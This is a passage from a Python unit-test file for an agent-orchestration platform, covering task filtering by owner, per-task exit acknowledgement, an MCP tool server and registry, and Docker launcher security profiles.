# ── Feature 2: Filter tasks by ownerUserId ─────────────────────────────────

class TestTaskFilterByOwner(unittest.TestCase):
    """Test task_store filtering by owner_user_id."""

    def test_list_tasks_filter_by_owner(self):
        from common.task_store import TaskStore
        store = TaskStore()
        t1 = store.create()
        t1.owner_user_id = "alice"
        t2 = store.create()
        t2.owner_user_id = "bob"
        t3 = store.create()
        t3.owner_user_id = "alice"

        all_tasks = store.list_tasks()
        self.assertEqual(len(all_tasks), 3)

        alice_tasks = store.list_tasks("alice")
        self.assertEqual(len(alice_tasks), 2)
        bob_tasks = store.list_tasks("bob")
        self.assertEqual(len(bob_tasks), 1)

    def test_filter_empty_owner(self):
        from common.task_store import TaskStore
        store = TaskStore()
        t1 = store.create()
        t1.owner_user_id = "alice"
        t2 = store.create()
        t2.owner_user_id = ""

        all_tasks = store.list_tasks()
        no_filter = [t for t in all_tasks]
        self.assertEqual(len(no_filter), 2)

        alice_only = store.list_tasks("alice")
        self.assertEqual(len(alice_only), 1)

    def test_filter_nonexistent_owner(self):
        from common.task_store import TaskStore
        store = TaskStore()
        t1 = store.create()
        t1.owner_user_id = "alice"

        filtered = store.list_tasks("charlie")
        self.assertEqual(len(filtered), 0)


# ── Feature 3: Per-task agent ACK endpoint ─────────────────────────────────

class TestPerTaskExitHandlerExtended(unittest.TestCase):
    """Extended tests for PerTaskExitHandler."""

    def test_build_exit_rule(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.build(rule_type="immediate", ack_timeout_seconds=60)
        self.assertEqual(rule["type"], "immediate")
        self.assertEqual(rule["ack_timeout_seconds"], 60)

    def test_build_default(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.build()
        self.assertEqual(rule["type"], "wait_for_parent_ack")
        self.assertEqual(rule["ack_timeout_seconds"], 300)

    def test_parse_missing_exit_rule(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.parse({})
        self.assertEqual(rule["type"], "wait_for_parent_ack")
        self.assertEqual(rule["ack_timeout_seconds"], 300)

    def test_parse_none_metadata(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.parse(None)
        self.assertEqual(rule["type"], "wait_for_parent_ack")

    def test_parse_custom_exit_rule(self):
        from common.per_task_exit import PerTaskExitHandler
        metadata = {"exitRule": {"type": "immediate", "ack_timeout_seconds": 30}}
        rule = PerTaskExitHandler.parse(metadata)
        self.assertEqual(rule["type"], "immediate")
        self.assertEqual(rule["ack_timeout_seconds"], 30)

    def test_register_and_acknowledge(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-100")
        result = handler.acknowledge("task-100")
        self.assertTrue(result)

    def test_acknowledge_unknown_task(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        result = handler.acknowledge("nonexistent")
        self.assertFalse(result)

    def test_wait_with_early_ack(self):
        import threading
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-200")

        def ack_later():
            time.sleep(0.1)
            handler.acknowledge("task-200")

        t = threading.Thread(target=ack_later, daemon=True)
        t.start()
        result = handler.wait("task-200", timeout=5)
        self.assertTrue(result)

    def test_wait_timeout(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-300")
        result = handler.wait("task-300", timeout=0.1)
        self.assertFalse(result)

    def test_cleanup(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-400")
        handler.cleanup("task-400")
        result = handler.acknowledge("task-400")
        self.assertFalse(result)

    def test_apply_immediate(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        shutdown_called = []
        handler.apply(
            "task-500",
            {"type": "immediate"},
            shutdown_fn=lambda delay_seconds=2: shutdown_called.append(delay_seconds),
            agent_id="test",
        )
        self.assertEqual(len(shutdown_called), 1)

    def test_apply_persistent_no_shutdown(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        shutdown_called = []
        handler.apply(
            "task-600",
            {"type": "persistent"},
            shutdown_fn=lambda delay_seconds=2: shutdown_called.append(delay_seconds),
            agent_id="test",
        )
        self.assertEqual(len(shutdown_called), 0)

    def test_apply_wait_for_ack_with_timeout(self):
        import threading
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        shutdown_called = []

        def run_apply():
            handler.apply(
                "task-700",
                {"type": "wait_for_parent_ack", "ack_timeout_seconds": 1},
                shutdown_fn=lambda delay_seconds=2: shutdown_called.append(delay_seconds),
                agent_id="test",
            )

        t = threading.Thread(target=run_apply, daemon=True)
        t.start()
        t.join(timeout=5)
        self.assertFalse(t.is_alive())
        self.assertEqual(len(shutdown_called), 1)


# ── Feature 4: MCP containerized server ────────────────────────────────────

class TestMCPConstellationServer(unittest.TestCase):
    """Test the embeddable MCP constellation server module loading."""

    def setUp(self):
        from common.tools.registry import snapshot_registry
        self._registry_snapshot = snapshot_registry()

    def tearDown(self):
        from common.tools.registry import restore_registry
        restore_registry(self._registry_snapshot)

    def test_load_tool_modules_empty(self):
        from common.mcp.constellation_server import _load_tool_modules
        from common.tools.registry import clear_registry
        clear_registry()
        loaded = _load_tool_modules(["nonexistent_module"])
        self.assertEqual(loaded, [])

    def test_load_valid_tool_module(self):
        from common.tools.registry import clear_registry, list_tools
        clear_registry()
        from common.mcp.constellation_server import _load_tool_modules
        # Load one of the known tool modules
        loaded = _load_tool_modules(["jira_tools"])
        # The module might fail if env vars missing, but _load_tool_modules handles that gracefully
        # We just check it doesn't raise
        self.assertIsInstance(loaded, list)

    def test_known_tool_modules_list(self):
        from common.mcp.constellation_server import _KNOWN_TOOL_MODULES
        self.assertIn("jira_tools", _KNOWN_TOOL_MODULES)
        self.assertIn("scm_tools", _KNOWN_TOOL_MODULES)
        self.assertIn("design_tools", _KNOWN_TOOL_MODULES)

    def test_main_with_empty_tools_flag(self):
        """Verify main() parses --tools correctly (doesn't start server — that blocks)."""
        # We can't actually run main() because start_mcp_server blocks on stdin.
        # Instead verify parsing logic by testing _load_tool_modules.
        from common.mcp.constellation_server import _load_tool_modules
        from common.tools.registry import clear_registry
        clear_registry()
        loaded = _load_tool_modules([])
        # When called with empty list, it loads all known modules
        # Some may fail due to missing env vars but should not raise
        self.assertIsInstance(loaded, list)

    def test_bootstrap_tools_from_mcp_servers_filters_constellation_servers(self):
        from common.mcp.constellation_server import bootstrap_tools_from_mcp_servers
        from common.tools.registry import clear_registry, is_registered

        clear_registry()
        loaded = bootstrap_tools_from_mcp_servers({
            "constellation": {
                "command": "python3",
                "args": ["-m", "common.mcp.constellation_server", "--tools", "progress_tools"],
            },
            "external": {
                "command": "node",
                "args": ["server.js"],
            },
        })

        self.assertEqual(loaded["constellation"], ["progress_tools"])
        self.assertNotIn("external", loaded)
        self.assertTrue(is_registered("report_progress"))


class TestMCPAdapter(unittest.TestCase):
    """Test MCP adapter request handling."""

    def setUp(self):
        from common.tools.registry import snapshot_registry, clear_registry
        self._registry_snapshot = snapshot_registry()
        clear_registry()

    def tearDown(self):
        from common.tools.registry import restore_registry
        restore_registry(self._registry_snapshot)

    def test_initialize(self):
        from common.tools.mcp_adapter import _handle_request
        resp = _handle_request({"id": 1, "method": "initialize"})
        self.assertEqual(resp["id"], 1)
        self.assertIn("protocolVersion", resp["result"])
        self.assertIn("capabilities", resp["result"])

    def test_tools_list_empty(self):
        from common.tools.mcp_adapter import _handle_request
        resp = _handle_request({"id": 2, "method": "tools/list"})
        self.assertEqual(resp["result"]["tools"], [])

    def test_tools_call_unknown(self):
        from common.tools.mcp_adapter import _handle_request
        resp = _handle_request({"id": 3, "method": "tools/call", "params": {"name": "nonexistent"}})
        self.assertIn("error", resp)

    def test_unknown_method(self):
        from common.tools.mcp_adapter import _handle_request
        resp = _handle_request({"id": 4, "method": "unknown/method"})
        self.assertIn("error", resp)
        self.assertIn("Method not found", resp["error"]["message"])

    def test_tools_call_with_registered_tool(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool
        from common.tools.mcp_adapter import _handle_request

        class EchoTool(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="echo", description="Echo input", input_schema={"type": "object", "properties": {"msg": {"type": "string"}}})

            def execute(self, args):
                return self.ok(args.get("msg", ""))

        register_tool(EchoTool())
        resp = _handle_request({"id": 5, "method": "tools/call", "params": {"name": "echo", "arguments": {"msg": "hello"}}})
        self.assertFalse(resp["result"]["isError"])
        self.assertEqual(resp["result"]["content"][0]["text"], "hello")


class TestToolRegistry(unittest.TestCase):
    """Test tool registry operations."""

    def setUp(self):
        from common.tools.registry import snapshot_registry, clear_registry
        self._registry_snapshot = snapshot_registry()
        clear_registry()

    def tearDown(self):
        from common.tools.registry import restore_registry
        restore_registry(self._registry_snapshot)

    def test_register_and_get(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool, get_tool

        class DummyTool(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="dummy", description="Dummy", input_schema={})
            def execute(self, args):
                return self.ok("done")

        register_tool(DummyTool())
        tool = get_tool("dummy")
        result = tool.execute({})
        self.assertFalse(result["isError"])

    def test_register_duplicate_raises(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool

        class Tool1(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="dup", description="Dup", input_schema={})
            def execute(self, args):
                return self.ok("")

        register_tool(Tool1())
        with self.assertRaises(ValueError):
            register_tool(Tool1())

    def test_get_unknown_raises(self):
        from common.tools.registry import get_tool
        with self.assertRaises(KeyError):
            get_tool("nonexistent_tool")

    def test_list_tools(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool, list_tools

        class T1(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="t1", description="", input_schema={})
            def execute(self, args):
                return self.ok("")

        class T2(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="t2", description="", input_schema={})
            def execute(self, args):
                return self.ok("")

        register_tool(T1())
        register_tool(T2())
        tools = list_tools()
        self.assertEqual(len(tools), 2)
        names = [t.schema.name for t in tools]
        self.assertIn("t1", names)
        self.assertIn("t2", names)

    def test_is_registered(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool, is_registered

        class Reg(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="regcheck", description="", input_schema={})
            def execute(self, args):
                return self.ok("")

        self.assertFalse(is_registered("regcheck"))
        register_tool(Reg())
        self.assertTrue(is_registered("regcheck"))


class TestNativeAdapter(unittest.TestCase):
    """Test native function-calling adapter."""

    def setUp(self):
        from common.tools.registry import snapshot_registry, clear_registry
        self._registry_snapshot = snapshot_registry()
        clear_registry()

    def tearDown(self):
        from common.tools.registry import restore_registry
        restore_registry(self._registry_snapshot)

    def test_get_function_definitions_empty(self):
        from common.tools.native_adapter import get_function_definitions
        defs = get_function_definitions()
        self.assertEqual(defs, [])

    def test_get_function_definitions_with_tool(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool
        from common.tools.native_adapter import get_function_definitions

        class SumTool(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(
                    name="sum_tool",
                    description="Sum numbers",
                    input_schema={"type": "object", "properties": {"a": {"type": "number"}, "b": {"type": "number"}}},
                )
            def execute(self, args):
                return self.ok(str(args.get("a", 0) + args.get("b", 0)))

        register_tool(SumTool())
        defs = get_function_definitions()
        self.assertEqual(len(defs), 1)
        self.assertEqual(defs[0]["type"], "function")
        self.assertEqual(defs[0]["function"]["name"], "sum_tool")

    def test_get_function_definitions_filters_requested_names(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool
        from common.tools.native_adapter import get_function_definitions

        class ToolA(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="tool_a", description="A", input_schema={})
            def execute(self, args):
                return self.ok("a")

        class ToolB(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="tool_b", description="B", input_schema={})
            def execute(self, args):
                return self.ok("b")

        register_tool(ToolA())
        register_tool(ToolB())
        defs = get_function_definitions(["tool_b", "missing_tool"])
        self.assertEqual([item["function"]["name"] for item in defs], ["tool_b"])

    def test_dispatch_function_call(self):
        from common.tools.base import ConstellationTool, ToolSchema
        from common.tools.registry import register_tool
        from common.tools.native_adapter import dispatch_function_call

        class PingTool(ConstellationTool):
            @property
            def schema(self):
                return ToolSchema(name="ping_tool", description="Ping", input_schema={})
            def execute(self, args):
                return self.ok("pong")

        register_tool(PingTool())
        result = dispatch_function_call("ping_tool", {})
        self.assertEqual(result, "pong")


# ── Feature 5: Launcher profile application ────────────────────────────────

class TestLauncherProfile(unittest.TestCase):
    """Test launcher security profile application."""

    def test_apply_default_profile(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {"AutoRemove": True}, "Labels": {}}
        Launcher._apply_launcher_profile({}, payload)
        self.assertEqual(payload["Labels"]["constellation.launcher_profile"], "default")
        # Default profile adds no extra restrictions
        self.assertNotIn("ReadonlyRootfs", payload["HostConfig"])

    def test_apply_docker_sandbox_profile(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {"AutoRemove": True}, "Labels": {}}
        Launcher._apply_launcher_profile(
            {"security": {"launcherProfile": "docker-sandbox"}},
            payload,
        )
        hc = payload["HostConfig"]
        self.assertTrue(hc["ReadonlyRootfs"])
        self.assertEqual(hc["CapDrop"], ["ALL"])
        self.assertEqual(hc["CapAdd"], ["NET_BIND_SERVICE"])
        self.assertIn("no-new-privileges", hc["SecurityOpt"])
        self.assertEqual(payload["Labels"]["constellation.launcher_profile"], "docker-sandbox")

    def test_apply_docker_restricted_profile(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {"AutoRemove": True}, "Labels": {}}
        Launcher._apply_launcher_profile(
            {"security": {"launcherProfile": "docker-restricted"}},
            payload,
        )
        hc = payload["HostConfig"]
        self.assertTrue(hc["ReadonlyRootfs"])
        self.assertEqual(hc["CapDrop"], ["ALL"])
        self.assertEqual(hc["NetworkMode"], "none")
        self.assertNotIn("CapAdd", hc)
        self.assertEqual(payload["Labels"]["constellation.launcher_profile"], "docker-restricted")

    def test_unknown_profile_falls_back_to_default(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {"AutoRemove": True}, "Labels": {}}
        Launcher._apply_launcher_profile(
            {"security": {"launcherProfile": "microvm-experimental"}},
            payload,
        )
        self.assertEqual(payload["Labels"]["constellation.requested_launcher_profile"], "microvm-experimental")
        self.assertEqual(payload["Labels"]["constellation.launcher_profile"], "default")
        self.assertNotIn("ReadonlyRootfs", payload["HostConfig"])

    def test_no_security_section(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {}, "Labels": {}}
        Launcher._apply_launcher_profile({"image": "test:latest"}, payload)
        self.assertEqual(payload["Labels"]["constellation.launcher_profile"], "default")

    def test_profile_preserves_existing_host_config(self):
        from common.launcher import Launcher
        payload = {"HostConfig": {"AutoRemove": True, "Memory": 536870912}, "Labels": {}}
        Launcher._apply_launcher_profile(
            {"security": {"launcherProfile": "docker-sandbox"}},
            payload,
        )
        self.assertTrue(payload["HostConfig"]["AutoRemove"])
        self.assertEqual(payload["HostConfig"]["Memory"], 536870912)
        self.assertTrue(payload["HostConfig"]["ReadonlyRootfs"])

    def test_launcher_profiles_dict(self):
        from common.launcher import Launcher
        self.assertIn("default", Launcher._LAUNCHER_PROFILES)
        self.assertIn("docker-sandbox", Launcher._LAUNCHER_PROFILES)
        self.assertIn("docker-restricted", Launcher._LAUNCHER_PROFILES)

    def test_launch_instance_applies_runtime_launch_contribution(self):
        from common.launcher import Launcher
        from common.runtime.provider_registry import RuntimeLaunchContribution, VolumeMount

        launcher = Launcher()
        requests = []

        def _fake_request(method, path, payload=None):
            requests.append((method, path, payload))
            return {}

        launcher._request = _fake_request
        launcher._discover_host_source = lambda path: "/host/artifacts" if path == "/app/artifacts" else path

        contribution = RuntimeLaunchContribution(
            mounts=[VolumeMount(source="/host/tools", target="/mnt/tools", read_only=True)],
            env={"EXTRA_FLAG": "1"},
            launcher_profile="docker-restricted",
        )
        agent_definition = {
            "agent_id": "demo-agent",
            "display_name": "Demo Agent",
            "execution_mode": "per-task",
            "launch_spec": {
                "image": "demo:latest",
                "port": 9001,
                "command": ["python3", "demo/app.py"],
                "mountDockerSocket": False,
                "env": {"AGENT_RUNTIME": "demo-runtime"},
            },
        }

        with patch.dict(os.environ, {"ARTIFACT_ROOT": "/app/artifacts"}, clear=False), \
             patch("common.launcher.time.sleep", return_value=None), \
             patch("common.runtime.provider_registry.get_launch_contribution", return_value=contribution):
            launcher.launch_instance(agent_definition, "TASK-42")

        create_payload = requests[0][2]
        self.assertIn("EXTRA_FLAG=1", create_payload["Env"])
        self.assertIn("/host/tools:/mnt/tools:ro", create_payload["HostConfig"]["Binds"])
        self.assertEqual(create_payload["Labels"]["constellation.launcher_profile"], "docker-restricted")


if __name__ == "__main__":
    unittest.main()
